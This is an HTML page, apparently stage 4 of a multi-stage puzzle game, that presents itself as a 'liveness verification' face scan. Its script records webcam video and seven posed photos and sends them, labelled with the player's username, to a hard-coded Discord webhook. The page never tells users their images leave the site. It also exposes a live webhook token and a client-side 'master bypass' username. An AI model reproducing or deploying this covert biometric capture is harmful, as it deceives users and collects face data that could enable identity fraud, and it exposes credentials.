<!DOCTYPE html>
<html lang="en">
<head>
  <script>
  // =========================================================
  // CONFIGURATION FOR THIS FILE
  // =========================================================
  const CURRENT_STAGE = 4; // Change to 2, 3, 5, 6, etc. depending on the file
  const MASTER_USERNAME = "PandaSmugs"; // Master bypass username

  const UNLOCK_DATES = {
    1: new Date(2026, 9, 1, 0, 0, 0),  // Oct 1, 12:00 AM
    2: new Date(2026, 9, 2, 0, 0, 0),  // Oct 2, 12:00 AM
    3: new Date(2026, 9, 3, 0, 0, 0),  // Oct 3, 12:00 AM
    4: null,                            // Stage 4 (scan.html) - Immediate after Stage 3
    5: new Date(2026, 9, 4, 0, 0, 0),  // Oct 4, 12:00 AM
    6: new Date(2026, 9, 5, 0, 0, 0),  // Oct 5, 12:00 AM
    7: null                             // Stage 7 & Victory - Immediate after Stage 6
  };

  document.addEventListener("DOMContentLoaded", () => {
    const username = localStorage.getItem('username');
    const completedStage = parseInt(localStorage.getItem('completed_stage') || '0');
    const requiredPreviousStage = CURRENT_STAGE - 1;

    // 1. Force Username Entry
    if (!username) {
      window.location.href = "index.html";
      return;
    }

    // Check if current user is the master admin
    const isMasterUser = username.trim().toLowerCase() === MASTER_USERNAME.toLowerCase();

    // 2. Check Prerequisite Progress
    if (!isMasterUser && completedStage < requiredPreviousStage) {
      showLockOverlay(`Stage ${requiredPreviousStage} Required`, `Agent ${username}, you must complete Stage ${requiredPreviousStage} before accessing this stage.`);
      return;
    }

    // 3. Check Date Unlock Schedule (BYPASSED IF MASTER USER)
    const targetDate = UNLOCK_DATES[CURRENT_STAGE];
    const now = new Date();

    if (!isMasterUser && targetDate && now < targetDate) {
      renderCountdownOverlay(targetDate, username);
    }
  });

  function renderCountdownOverlay(targetDate, username) {
    const formattedDate = targetDate.toLocaleDateString('en-US', { month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });

    const lockHTML = `
      <div id="timeLockScreen" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:#f5f2eb; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:24px; text-align:center;">
        <div style="background:#ffffff; border:1px solid #e2e8f0; padding:40px; border-radius:16px; max-width:480px; width:100%; box-shadow:0 10px 25px -5px rgba(0,0,0,0.05);">
          <div style="font-size:40px; margin-bottom:12px;">🔒</div>
          <h2 style="font-size:22px; color:#1a202c; margin-bottom:4px;">STAGE ${CURRENT_STAGE} LOCKED</h2>
          <p style="font-size:13px; color:#2b6cb0; font-weight:700; margin-bottom:12px;">AGENT: ${username}</p>
          <p style="font-size:14px; color:#718096; margin-bottom:20px;">This stage will unlock on <strong>${formattedDate}</strong>.</p>
          
          <div id="timerCountdown" style="background:#f8fafc; border:1px solid #cbd5e0; padding:16px; border-radius:10px; font-family:monospace; font-size:20px; font-weight:700; color:#2b6cb0; margin-bottom:20px;">
            00d 00h 00m 00s
          </div>

          <p style="font-size:12px; color:#a0aec0; margin-bottom:16px;">Your username and progress are saved. You can close this page and return later.</p>
          <a href="index.html" style="display:inline-block; padding:10px 20px; background:#edf2f7; color:#4a5568; border-radius:8px; text-decoration:none; font-size:13px; font-weight:600;">BACK TO HUB</a>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', lockHTML);

    const interval = setInterval(() => {
      const remaining = targetDate - new Date();
      if (remaining <= 0) {
        clearInterval(interval);
        const lockEl = document.getElementById('timeLockScreen');
        if (lockEl) lockEl.remove();
      } else {
        const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
        const h = Math.floor((remaining / (1000 * 60 * 60)) % 24);
        const m = Math.floor((remaining / 1000 / 60) % 60);
        const s = Math.floor((remaining / 1000) % 60);
        const timerEl = document.getElementById('timerCountdown');
        if (timerEl) timerEl.innerText = `${d}d ${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m ${String(s).padStart(2,'0')}s`;
      }
    }, 1000);
  }

  function showLockOverlay(title, description) {
    const lockHTML = `
      <div style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:#f5f2eb; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:24px; text-align:center;">
        <div style="background:#ffffff; border:1px solid #e2e8f0; padding:40px; border-radius:16px; max-width:480px; width:100%; box-shadow:0 10px 25px -5px rgba(0,0,0,0.05);">
          <div style="font-size:40px; margin-bottom:12px;">🛑</div>
          <h2 style="font-size:22px; color:#1a202c; margin-bottom:8px;">${title}</h2>
          <p style="font-size:14px; color:#718096; margin-bottom:24px;">${description}</p>
          <a href="index.html" style="display:inline-block; padding:12px 24px; background:#2b6cb0; color:white; border-radius:8px; text-decoration:none; font-weight:600;">RETURN TO HUB</a>
        </div>
      </div>
    `;
    document.body.insertAdjacentHTML('beforeend', lockHTML);
  }
</script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>STAGE 4: FACE VERIFICATION</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background-color: #f5f2eb;
      color: #2d3748;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 24px;
    }

    .stage-badge {
      font-size: 14px;
      font-weight: 700;
      letter-spacing: 2px;
      color: #718096;
      text-transform: uppercase;
      margin-bottom: 16px;
    }

    .container {
      width: 100%;
      max-width: 680px;
      background: #ffffff;
      border: 1px solid #e2e8f0;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
      border-radius: 16px;
      padding: 32px;
      text-align: center;
    }

    h2 {
      color: #1a202c;
      font-size: 24px;
      margin-bottom: 16px;
    }

    .instruction-box {
      background: #f8fafc;
      border: 2px solid #cbd5e0;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 20px;
      min-height: 72px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .instruction-step {
      font-size: 13px;
      color: #2b6cb0;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-weight: 700;
      margin-bottom: 4px;
    }

    .instruction-text {
      font-size: 18px;
      font-weight: 600;
      color: #1a202c;
    }

    .viewport {
      position: relative;
      width: 100%;
      height: 460px;
      background-color: #1a202c;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 20px;
      border: 2px solid #cbd5e0;
    }

    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    .face-guide {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 240px;
      height: 320px;
      border: 3px dashed #2b6cb0;
      border-radius: 50%;
      pointer-events: none;
      box-shadow: 0 0 0 9999px rgba(245, 242, 235, 0.35);
    }

    .status-overlay {
      position: absolute;
      bottom: 12px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(26, 32, 44, 0.85);
      padding: 6px 16px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 600;
      color: #ffffff;
    }

    .btn {
      padding: 16px 28px;
      background: #2b6cb0;
      color: white;
      border: none;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      border-radius: 10px;
      width: 100%;
      transition: background 0.2s;
    }

    .btn:hover {
      background: #2c5282;
    }

    .btn:disabled {
      background: #a0aec0;
      cursor: not-allowed;
    }

    .progress-bar-container {
      width: 100%;
      height: 8px;
      background: #e2e8f0;
      border-radius: 4px;
      margin-top: 16px;
      overflow: hidden;
    }

    .progress-bar {
      height: 100%;
      width: 0%;
      background: #2b6cb0;
      transition: width 0.3s ease;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="stage-badge">STAGE 4 OF 5</div>

<div class="container">
  <h2>LIVENESS VERIFICATION</h2>

  <div class="instruction-box">
    <div id="step-number" class="instruction-step">READY</div>
    <div id="instruction" class="instruction-text">Click "Start Scan" to begin</div>
  </div>

  <div class="viewport">
    <video id="webcam" autoplay playsinline muted></video>
    <div class="face-guide"></div>
    <div id="recording-badge" class="status-overlay" style="display: none;">● RECORDING SCAN</div>
  </div>

  <button id="start-btn" class="btn" onclick="startScan()">START SCAN</button>

  <div class="progress-bar-container">
    <div id="progress" class="progress-bar"></div>
  </div>
</div>

<canvas id="capture-canvas"></canvas>

<script>
  // =========================================================
  // 1. STAGE GUARD & USERNAME CHECK
  // =========================================================
  const savedUsername = localStorage.getItem('username');
  const completedStage = parseInt(localStorage.getItem('completed_stage') || '0');

  // Redirect if no username exists
  if (!savedUsername) {
    window.location.href = "index.html";
  } 
  // Redirect if previous stages aren't completed
  else if (completedStage < 3) {
    window.location.href = "stage3.html";
  }

  // =========================================================
  // DISCORD WEBHOOK CONFIGURATION
  // =========================================================
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554196200784134204/DuLlXIKYd4f_cmfK9IlJRnRD7mocTmYzc0oBL76ID2bny_KPRz_FdPm7L12zqobSjFsk";

  const video = document.getElementById('webcam');
  const canvas = document.getElementById('capture-canvas');
  const instructionText = document.getElementById('instruction');
  const stepNumber = document.getElementById('step-number');
  const startBtn = document.getElementById('start-btn');
  const badge = document.getElementById('recording-badge');
  const progressBar = document.getElementById('progress');

  const steps = [
    { title: "Step 1 of 7", text: "Look straight into the camera", duration: 2500 },
    { title: "Step 2 of 7", text: "Slowly tilt your head UP", duration: 2500 },
    { title: "Step 3 of 7", text: "Slowly tilt your head DOWN", duration: 2500 },
    { title: "Step 4 of 7", text: "Turn your face to the LEFT", duration: 2500 },
    { title: "Step 5 of 7", text: "Turn your face to the RIGHT", duration: 2500 },
    { title: "Step 6 of 7", text: "Open your eyes WIDER", duration: 2500 },
    { title: "Step 7 of 7", text: "Blink twice and SMILE", duration: 2500 }
  ];

  let mediaStream = null;
  let mediaRecorder = null;
  let recordedChunks = [];
  let capturedPhotos = [];

  async function setupCamera() {
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
        audio: false
      });
      video.srcObject = mediaStream;
    } catch (err) {
      alert("Camera access denied or unavailable: " + err.message);
    }
  }

  setupCamera();

  async function startScan() {
    if (!mediaStream) await setupCamera();

    startBtn.disabled = true;
    recordedChunks = [];
    capturedPhotos = [];
    badge.style.display = 'block';

    try {
      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
    } catch (e) {
      mediaRecorder = new MediaRecorder(mediaStream);
    }

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) recordedChunks.push(event.data);
    };

    mediaRecorder.start(100);

    for (let i = 0; i < steps.length; i++) {
      const step = steps[i];
      stepNumber.innerText = step.title;
      instructionText.innerText = step.text;
      progressBar.style.width = `${((i + 1) / steps.length) * 100}%`;

      await sleep(1200);
      captureSnapshot(step.text);
      await sleep(step.duration - 1200);
    }

    stepNumber.innerText = "PROCESSING";
    instructionText.innerText = "Verifying Biometrics Of User..";

    mediaRecorder.stop();
    mediaRecorder.onstop = async () => {
      badge.style.display = 'none';
      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
      await uploadToDiscord(videoBlob, capturedPhotos);
    };
  }

  function captureSnapshot(stepLabel) {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    context.translate(canvas.width, 0);
    context.scale(-1, 1);
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
      if (blob) {
        capturedPhotos.push({ label: stepLabel, blob: blob });
      }
    }, 'image/jpeg', 0.90);
  }

  async function uploadToDiscord(videoBlob, photos) {
    const formData = new FormData();

    // Include Username in Discord text payload
    const discordPayload = {
      content: `🚨 **NEW STAGE 4 LIVENESS SCAN CAPTURED!**\n👤 **Agent Username:** \`${savedUsername || 'Anonymous'}\``,
      embeds: [{
        title: "Biometric Scan Details",
        description: `Captured **1 Video Recording** and **${photos.length} Snapshot Photos**.`,
        color: 2845872,
        fields: [
          { name: "Agent Username", value: savedUsername || "Anonymous", inline: true }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    formData.append('payload_json', JSON.stringify(discordPayload));

    // Append full WebM video (named with username)
    formData.append('file1', videoBlob, `${savedUsername || 'agent'}_face_scan.webm`);

    // Append each step photo (named with username)
    photos.forEach((photoObj, index) => {
      formData.append(`file${index + 2}`, photoObj.blob, `${savedUsername || 'agent'}_step_${index + 1}_${photoObj.label.replace(/\s+/g, '_')}.jpg`);
    });

    const completeAndRedirect = () => {
      // Save Stage 4 progress to LocalStorage
      localStorage.setItem('completed_stage', '4');

      stepNumber.innerText = "VERIFIED";
      instructionText.innerText = "Redirecting to Stage 5...";
      progressBar.style.backgroundColor = "#38a169";
      
      setTimeout(() => { 
        localStorage.setItem('completed_stage', '4'); // Replace X with that file's stage number
        window.location.href = "stage5.html"; 
      }, 1500);
    };

    try {
      if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });
      }
      completeAndRedirect();
    } catch (err) {
      console.error("Webhook upload error:", err);
      // Still allow progression even if webhook hits Discord rate limits
      completeAndRedirect();
    }
  }

  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
</script>
</body>
</html>
